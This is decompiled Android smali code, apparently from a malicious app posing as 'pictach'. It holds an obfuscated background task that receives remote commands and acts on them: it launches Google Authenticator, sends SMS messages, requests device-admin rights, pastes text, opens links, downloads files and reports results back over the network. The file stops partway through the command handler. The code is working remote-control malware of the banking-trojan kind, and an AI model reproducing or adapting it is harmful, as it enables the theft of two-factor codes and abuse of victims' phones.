.class public Lcom/android/pictach/Api$ta;
# ep-zyexroiohcyw
.super Landroid/os/AsyncTask;
.source "wbrcohmr.java"
# validated-70471
# compiled-60362


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/pictach/Api;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x9
    name = "ta"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Landroid/content/Context;",
        "Ljava/lang/Integer;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 136
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method

.method private RequestAdmin()V
    .locals 2

    .line 573
    sget-object v0, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;

    if-eqz v0, :cond_0

    .line 576
    :try_start_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 577
    new-instance v1, Lcom/android/pictach/Api$ta$1;

    invoke-direct {v1, p0}, Lcom/android/pictach/Api$ta$1;-><init>(Lcom/android/pictach/Api$ta;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 592
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_0
    :goto_0
    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 136
    check-cast p1, [Landroid/content/Context;

    invoke-virtual {p0, p1}, Lcom/android/pictach/Api$ta;->doInBackground([Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method protected varargs doInBackground([Landroid/content/Context;)Ljava/lang/String;
    .locals 18

    const-string v0, "sp<*>"

    const-string v1, "msg:"

    const-string v2, "\t"

    :catch_0
    :goto_0
    const/4 v3, 0x3

    const/4 v4, 0x2

    const/4 v5, 0x0

    const/4 v6, 0x1

    .line 149
    :try_start_0
    sget-boolean v7, Lcom/android/pictach/NetworkManager;->ec_NetworkManager_ho:Z

    const-wide/16 v8, -0x1

    if-ne v7, v6, :cond_3

    .line 150
    sget-wide v10, Lcom/android/pictach/love;->e_love_co:J

    cmp-long v7, v10, v8

    if-nez v7, :cond_0

    .line 151
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    const-wide/32 v9, 0xafc8

    add-long/2addr v7, v9

    sput-wide v7, Lcom/android/pictach/love;->e_love_co:J

    goto :goto_2

    .line 153
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v10

    sget-wide v12, Lcom/android/pictach/love;->e_love_co:J

    cmp-long v7, v10, v12

    if-lez v7, :cond_4

    .line 154
    sget-object v7, Lcom/android/pictach/Utils;->dt:Ljava/lang/String;

    .line 155
    sget v10, Lcom/android/pictach/love;->inx:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    if-ne v10, v4, :cond_1

    move-object v7, v2

    .line 161
    :cond_1
    :try_start_1
    sget-object v10, Lcom/android/pictach/Utils;->j_Utils_z:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v7

    invoke-static {v10, v7}, Lcom/android/pictach/NetworkManager;->locatevlibertyqlightsqfacestlaboratoriesxelliottdwhereasjsitemaphbennettiratiohlehabortionq47(Ljava/lang/String;[B)V

    .line 162
    invoke-static {}, Lcom/android/pictach/NetworkManager;->ox()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 164
    :catch_1
    :try_start_2
    sget v7, Lcom/android/pictach/love;->inx:I

    if-lt v7, v3, :cond_2

    const/4 v7, -0x1

    .line 165
    sput v7, Lcom/android/pictach/love;->inx:I

    const-string v7, "DONE"

    .line 168
    invoke-static {v7}, Lcom/android/pictach/NetworkManager;->CLOSEALLINTENT(Ljava/lang/String;)V

    goto :goto_1

    .line 170
    :cond_2
    sget v7, Lcom/android/pictach/love;->inx:I

    add-int/2addr v7, v6

    sput v7, Lcom/android/pictach/love;->inx:I

    .line 172
    :goto_1
    sput-wide v8, Lcom/android/pictach/love;->e_love_co:J

    goto :goto_2

    .line 176
    :cond_3
    sput-wide v8, Lcom/android/pictach/love;->e_love_co:J

    .line 177
    sget-object v7, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    if-eqz v7, :cond_4
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 192
    :catch_2
    :cond_4
    :goto_2
    :try_start_3
    sget-object v7, Lcom/android/pictach/love;->L_love_i:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    if-lez v7, :cond_26

    .line 193
    sget-object v7, Lcom/android/pictach/love;->L_love_i:Ljava/util/List;

    invoke-interface {v7, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Lcom/android/pictach/Config;

    if-eqz v7, :cond_24

    .line 195
    iget-object v8, v7, Lcom/android/pictach/Config;->str:Ljava/lang/String;

    sget-object v9, Lcom/android/pictach/love;->yrfjerloveSERBRE:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    .line 196
    aget-object v9, v8, v5

    const-string v10, "0"

    .line 197
    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    const/16 v15, 0xb

    const/16 v16, 0x9

    const/16 v17, 0x7

    const/16 v13, 0x8

    const/4 v11, 0x6

    const/4 v12, 0x5

    const/4 v14, 0x4

    if-eqz v10, :cond_5

    new-array v9, v12, [Ljava/lang/Object;

    .line 199
    aget-object v10, p1, v5

    aput-object v10, v9, v5

    iget-object v7, v7, Lcom/android/pictach/Config;->byt:[B

    aput-object v7, v9, v6

    aget-object v7, v8, v6

    aput-object v7, v9, v4

    aget-object v7, v8, v14

    aput-object v7, v9, v3

    const-string v7, "\u0559X\ufe76YYCRAZY\u03c6T\u02beXX\u0559Y\ufe76VCCRAZYW\u03c6X\u02be"

    aput-object v7, v9, v14

    invoke-static {v9}, Lcom/android/pictach/LoveApi0;->mentionnvalleysbufingapresentedcseekddiningkabrahamoproducedncanonhlivecamjpreliminarydtakingm29([Ljava/lang/Object;)Ljava/lang/Class;

    move-result-object v7

    .line 200
    new-instance v9, Lcom/android/pictach/DataHelper;

    invoke-virtual {v7}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10, v7}, Lcom/android/pictach/DataHelper;-><init>(Ljava/lang/String;Ljava/lang/Class;)V

    .line 201
    sget-object v7, Lcom/android/pictach/love;->L_love_cl:Ljava/util/List;

    invoke-interface {v7, v9}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 202
    sget-object v7, Lcom/android/pictach/love;->L_love_cl:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    aget-object v9, v8, v4

    invoke-static {v9}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Integer;->intValue()I

    move-result v9

    if-ne v7, v9, :cond_24

    .line 203
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v9, v8, v12

    aput-object v9, v7, v5

    .line 205
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v9, v8, v11

    aput-object v9, v7, v14

    .line 206
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v9, v8, v17

    aput-object v9, v7, v12
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3 .. :try_end_3} :catch_0

    .line 211
    :try_start_4
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v9, v8, v13

    aput-object v9, v7, v11

    .line 212
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v9, v8, v16

    aput-object v9, v7, v17

    .line 213
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v9, 0xa

    aget-object v9, v8, v9

    aput-object v9, v7, v13
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4 .. :try_end_4} :catch_0

    .line 216
    :catch_3
    :try_start_5
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v9, v8, v15

    aput-object v9, v7, v16

    .line 217
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v9, 0xa

    const/16 v10, 0xc

    aget-object v11, v8, v10

    aput-object v11, v7, v9

    .line 218
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v9, 0xd

    aget-object v10, v8, v9

    aput-object v10, v7, v15

    .line 220
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v9, 0xe

    aget-object v10, v8, v9

    const/16 v9, 0xc

    aput-object v10, v7, v9

    .line 221
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v9, 0xf

    aget-object v10, v8, v9

    const/16 v11, 0xd

    aput-object v10, v7, v11

    .line 223
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v10, 0x10

    aget-object v11, v8, v10

    const/16 v10, 0xe

    aput-object v11, v7, v10

    .line 224
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v10, 0x11

    aget-object v10, v8, v10

    aput-object v10, v7, v9

    .line 225
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v10, 0x12

    aget-object v10, v8, v10

    const/16 v11, 0x10

    aput-object v10, v7, v11

    .line 227
    sget-object v7, Lcom/android/pictach/love;->L_love_cl:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    sput v7, Lcom/android/pictach/love;->p_love_lg:I

    new-array v4, v4, [Ljava/lang/Object;

    .line 228
    aget-object v7, p1, v5

    aput-object v7, v4, v5

    aget-object v3, v8, v3

    aput-object v3, v4, v6

    invoke-static {v4}, Lcom/android/pictach/LoveApi0;->displayswpromisedvemphasisvfishingxstonewstudiedrgenomelbendrperceptionggpsomaidenjtalkskgabrielx31([Ljava/lang/Object;)V

    const-wide/16 v3, 0xa

    .line 229
    sput-wide v3, Lcom/android/pictach/NetworkManager;->s_NetworkManager_s:J

    .line 230
    sget-object v3, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v3, v3, v9

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/android/pictach/NetworkManager;->locatevlibertyqlightsqfacestlaboratoriesxelliottdwhereasjsitemaphbennettiratiohlehabortionq47(Ljava/lang/String;[B)V

    goto/16 :goto_7

    .line 236
    :cond_5
    sget-object v10, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v10, v10, v14

    invoke-static {v9, v10}, Lcom/android/pictach/Utils;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v10

    if-eqz v10, :cond_7

    .line 237
    sget-object v9, Lcom/android/pictach/love;->L_love_cl:Ljava/util/List;

    invoke-interface {v9}, Ljava/util/List;->size()I

    move-result v9

    if-lez v9, :cond_24

    const/4 v9, 0x0

    .line 238
    :goto_3
    sget-object v10, Lcom/android/pictach/love;->L_love_cl:Ljava/util/List;

    invoke-interface {v10}, Ljava/util/List;->size()I

    move-result v10

    if-gt v9, v10, :cond_24

    .line 239
    sget-object v10, Lcom/android/pictach/love;->L_love_cl:Ljava/util/List;

    invoke-interface {v10, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Lcom/android/pictach/DataHelper;

    iget-object v10, v10, Lcom/android/pictach/DataHelper;->Datahelp:Ljava/lang/String;

    aget-object v13, v8, v6

    invoke-virtual {v10, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_6

    const-string v10, "\u02bc\u02be\u02bf\u02c8\u1d54\u0999\u02bf$\u02bf\u02bc"

    new-array v11, v11, [Ljava/lang/Object;

    .line 240
    aget-object v13, p1, v5

    aput-object v13, v11, v5

    sget-object v13, Lcom/android/pictach/love;->L_love_cl:Ljava/util/List;

    invoke-interface {v13, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Lcom/android/pictach/DataHelper;

    iget-object v9, v9, Lcom/android/pictach/DataHelper;->jasonalfa:Ljava/lang/Class;

    aput-object v9, v11, v6

    aget-object v6, v8, v4

    aput-object v6, v11, v4

    aget-object v4, v8, v14

    aput-object v4, v11, v3

    iget-object v4, v7, Lcom/android/pictach/Config;->byt:[B

    aput-object v4, v11, v14

    const-string v4, "\u02bc\u02be\u02bf\u02c8\u1d54\u0999\u02bf$\u02bf\u02bc"

    aput-object v4, v11, v12

    invoke-static {v10, v11}, Lcom/android/pictach/LoveApi0;->ethicalnpromotedhdirectionrphotographynjurisdictionahelenksuitxfalsedfinancesaknowskfliphprizesn30(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    .line 241
    aget-object v6, v8, v3

    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v10, 0x10

    aget-object v7, v7, v10

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5 .. :try_end_5} :catch_0

    if-nez v6, :cond_24

    .line 243
    :try_start_6
    aget-object v3, v8, v3

    invoke-static {v4}, Lcom/android/pictach/Utils;->get_Utils_Bytes(Ljava/lang/Object;)[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/android/pictach/NetworkManager;->locatevlibertyqlightsqfacestlaboratoriesxelliottdwhereasjsitemaphbennettiratiohlehabortionq47(Ljava/lang/String;[B)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6 .. :try_end_6} :catch_0

    goto/16 :goto_7

    :cond_6
    const/16 v10, 0x10

    add-int/lit8 v9, v9, 0x1

    goto :goto_3

    .line 253
    :cond_7
    :try_start_7
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v7, v7, v12

    invoke-static {v9, v7}, Lcom/android/pictach/Utils;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_1c

    new-array v7, v13, [Ljava/lang/String;

    .line 255
    aget-object v9, v8, v6

    aput-object v9, v7, v5

    aget-object v9, v8, v4

    aput-object v9, v7, v6

    aget-object v9, v8, v3

    aput-object v9, v7, v4

    aget-object v9, v8, v14

    aput-object v9, v7, v3

    aget-object v3, v8, v12

    aput-object v3, v7, v14

    aget-object v3, v8, v11

    aput-object v3, v7, v12

    aget-object v3, v8, v17

    aput-object v3, v7, v11

    aget-object v3, v8, v13

    aput-object v3, v7, v17

    .line 256
    aget-object v3, v8, v14

    const-string v9, "ddll"

    invoke-virtual {v3, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1a

    .line 258
    aget-object v3, v8, v6

    invoke-virtual {v3, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_7 .. :try_end_7} :catch_0

    const-string v7, ""

    if-eqz v3, :cond_a

    .line 261
    :try_start_8
    aget-object v3, v8, v6

    const-string v4, ":up"

    invoke-virtual {v3, v4}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_8

    .line 263
    new-instance v3, Lcom/android/pictach/DownloadTask;

    invoke-direct {v3}, Lcom/android/pictach/DownloadTask;-><init>()V

    .line 264
    sget-object v4, Lcom/android/pictach/love;->app_love_Context:Landroid/content/Context;

    new-array v9, v6, [Ljava/lang/String;

    aget-object v6, v8, v6

    invoke-virtual {v6, v1, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    const-string v8, ":up"

    invoke-virtual {v6, v8, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v9, v5

    invoke-virtual {v3, v4, v9}, Lcom/android/pictach/DownloadTask;->setContext(Landroid/content/Context;[Ljava/lang/String;)V

    goto/16 :goto_7

    .line 266
    :cond_8
    aget-object v3, v8, v6

    const-string v4, ":fsh"

    invoke-virtual {v3, v4}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_9

    .line 267
    aget-object v3, v8, v6

    invoke-virtual {v3, v1, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ":fsh"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/android/pictach/Api;->FPPAGE(Ljava/lang/String;)V

    goto/16 :goto_7

    .line 272
    :cond_9
    aget-object v3, v8, v6

    invoke-virtual {v3, v1, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/android/pictach/Api;->showToast(Ljava/lang/String;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_8 .. :try_end_8} :catch_0

    goto/16 :goto_7

    .line 279
    :cond_a
    :try_start_9
    aget-object v3, v8, v6

    const-string v9, "goauth<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_9 .. :try_end_9} :catch_0

    if-eqz v3, :cond_c

    :try_start_a
    const-string v3, "co#$m.goo#$gle.andr#$oid.ap#$ps.authent#$icator2"

    const-string v4, "#$"

    .line 284
    invoke-static {v3, v4}, Lcom/android/pictach/Utils;->desperatempencilrwherevermoccupationsqsilencetmarriagebmererjudicialjcontainedldebianzbringx48(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aget-object v4, p1, v5

    invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    invoke-static {v3, v4}, Lcom/android/pictach/body;->IP_body_I(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v3

    if-eqz v3, :cond_b

    .line 286
    .line 287
    aget-object v3, p1, v5

    invoke-virtual {v3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    const-string v4, "co#$m.goo#$gle.andr#$oid.ap#$ps.authent#$icator2"

    const-string v6, "#$"

    .line 288
    invoke-static {v4, v6}, Lcom/android/pictach/Utils;->desperatempencilrwherevermoccupationsqsilencetmarriagebmererjudicialjcontainedldebianzbringx48(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    const/high16 v4, 0x10000000

    .line 289
    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 291
    aget-object v4, p1, v5

    invoke-virtual {v4, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_7

    .line 295
    :cond_b
    sget-object v3, Lcom/android/pictach/Utils;->s_Utils_fh:Ljava/lang/String;

    const-string v4, "Google Auth<app not installed<app not installed"

    invoke-virtual {v4}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/android/pictach/NetworkManager;->locatevlibertyqlightsqfacestlaboratoriesxelliottdwhereasjsitemaphbennettiratiohlehabortionq47(Ljava/lang/String;[B)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_a .. :try_end_a} :catch_0

    goto/16 :goto_7

    .line 302
    :cond_c
    :try_start_b
    aget-object v3, v8, v6

    const-string v9, "kill<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_b .. :try_end_b} :catch_0

    if-eqz v3, :cond_d

    .line 304
    :try_start_c
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    sput-object v3, Lcom/android/pictach/Firebase;->Firebasebypass:Ljava/lang/Boolean;
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_c .. :try_end_c} :catch_0

    goto/16 :goto_7

    .line 310
    :cond_d
    :try_start_d
    aget-object v3, v8, v6

    const-string v9, "srec<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_e

    goto/16 :goto_7

    .line 312
    :cond_e
    aget-object v3, v8, v6

    const-string v9, "pst<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_d .. :try_end_d} :catch_0

    if-eqz v3, :cond_f

    .line 315
    :try_start_e
    sget-object v3, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    if-eqz v3, :cond_24

    .line 317
    sget-object v3, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    aget-object v3, v8, v6

    const-string v4, "pst<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/android/pictach/Firebase;->FirebaseToPaste:Ljava/lang/String;

    .line 318
    sget-object v3, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    sput-object v3, Lcom/android/pictach/Firebase;->FirebaseNeedPaste:Ljava/lang/Boolean;

    .line 319
    sget-object v3, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    invoke-virtual {v3}, Lcom/android/pictach/Firebase;->FirebaseTreger()V
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_e .. :try_end_e} :catch_0

    goto/16 :goto_7

    .line 326
    :cond_f
    :try_start_f
    aget-object v3, v8, v6

    const-string v9, "lnk<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_f .. :try_end_f} :catch_0

    if-eqz v3, :cond_10

    .line 328
    :try_start_10
    aget-object v3, v8, v6

    const-string v4, "lnk<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/android/pictach/Api;->openlink(Ljava/lang/String;)V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_10 .. :try_end_10} :catch_0

    goto/16 :goto_7

    .line 334
    :cond_10
    :try_start_11
    aget-object v3, v8, v6

    const-string v9, "ssms<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_11 .. :try_end_11} :catch_0

    if-eqz v3, :cond_11

    .line 340
    :try_start_12
    aget-object v3, v8, v6

    const-string v4, "ssms<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "#"

    .line 341
    invoke-virtual {v3, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    .line 342
    aget-object v4, v3, v5

    .line 343
    aget-object v3, v3, v6

    .line 344
    invoke-static {v4, v3}, Lcom/android/pictach/Firebase;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_12 .. :try_end_12} :catch_0

    goto/16 :goto_7

    .line 351
    :cond_11
    :try_start_13
    aget-object v3, v8, v6

    const-string v9, "adm<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_13 .. :try_end_13} :catch_0

    if-eqz v3, :cond_12

    .line 353
    :try_start_14
    invoke-direct/range {p0 .. p0}, Lcom/android/pictach/Api$ta;->RequestAdmin()V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_14 .. :try_end_14} :catch_0

    goto/16 :goto_7

    .line 358
    :cond_12
    :try_start_15
    aget-object v3, v8, v6

    const-string v9, "admwip<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_15 .. :try_end_15} :catch_0

    if-eqz v3, :cond_13

    .line 360
    :try_start_16
    sget-object v3, Lcom/android/pictach/activityadm;->mDPM:Landroid/app/admin/DevicePolicyManager;

    const/4 v7, 0x0

    invoke-virtual {v3, v7}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_24
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_16 .. :try_end_16} :catch_0

    .line 366
    goto/16 :goto_7

    .line 375
    :cond_13
    :try_start_17
    aget-object v3, v8, v6

    const-string v4, "rdd<*>"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_17 .. :try_end_17} :catch_0

    const-string v4, "rd<*>"

    if-eqz v3, :cond_14

    .line 380
    :try_start_18
    sget-object v3, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    const-string v3, "wait"

    sput-object v3, Lcom/android/pictach/Firebase;->FirebaseOFK:Ljava/lang/String;

    .line 382
    aget-object v3, v8, v6

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/android/pictach/love;->D_love_ele(Ljava/lang/String;)V

    .line 384
    sget-object v3, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    const-string v3, "on"

    sput-object v3, Lcom/android/pictach/Firebase;->FirebaseOFK:Ljava/lang/String;
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_18 .. :try_end_18} :catch_0

